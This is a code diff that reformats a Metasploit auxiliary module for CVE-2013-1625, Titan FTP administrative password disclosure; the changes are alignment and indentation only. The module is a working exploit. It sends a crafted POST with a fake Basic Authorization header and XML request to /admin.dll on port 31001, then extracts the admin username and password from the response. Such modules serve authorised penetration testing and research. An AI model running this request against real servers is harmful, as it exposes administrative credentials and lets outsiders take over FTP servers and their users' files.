@@ -12,7 +12,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Titan FTP Administrative Password Disclosure',
+      'Name' => 'Titan FTP Administrative Password Disclosure',
       'Description' => %q{
         On Titan FTP servers prior to version 9.14.1628, an attacker can
       retrieve the username and password for the administrative XML-RPC
@@ -24,15 +24,13 @@ class MetasploitModule < Msf::Auxiliary
       add and remove FTP users, as well as add, remove, and modify
       available directories and their permissions.
       },
-      'Author'      =>
-        [
-          'Spencer McIntyre'
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2013-1625' ]
-        ]
+      'Author' => [
+        'Spencer McIntyre'
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'CVE', '2013-1625' ]
+      ]
     )
 
     register_options([Opt::RPORT(31001)])
@@ -41,15 +39,16 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     res = send_request_cgi(
       {
-        'uri'       => '/admin.dll',
-        'method'    => 'POST',
-        'headers'   => {
+        'uri' => '/admin.dll',
+        'method' => 'POST',
+        'headers' => {
           'SRT-WantXMLResponses' => 'true',
-          'SRT-XMLRequest'       => 'true',
-          'Authorization'        => 'Basic FAKEFAKE'
+          'SRT-XMLRequest' => 'true',
+          'Authorization' => 'Basic FAKEFAKE'
         },
-        'data'      => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
-      })
+        'data' => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
+      }
+    )
     return if not res
 
     if res.code == 400
@@ -69,14 +68,14 @@ class MetasploitModule < Msf::Auxiliary
     info = {}
     srdomainparams.elements.each do |node|
       case node.name
-        when "DomainName"
-          info[:domain] = Rex::Text.uri_decode(node.text)
-        when "BaseDataDir"
-          info[:basedir] = Rex::Text.uri_decode(node.text)
-        when "CreationDate"
-          info[:username] = Rex::Text.uri_decode(node.text)
-        when "CreationTime"
-          info[:password] = Rex::Text.uri_decode(node.text)
+      when "DomainName"
+        info[:domain] = Rex::Text.uri_decode(node.text)
+      when "BaseDataDir"
+        info[:basedir] = Rex::Text.uri_decode(node.text)
+      when "CreationDate"
+        info[:username] = Rex::Text.uri_decode(node.text)
+      when "CreationTime"
+        info[:password] = Rex::Text.uri_decode(node.text)
       end
     end
 
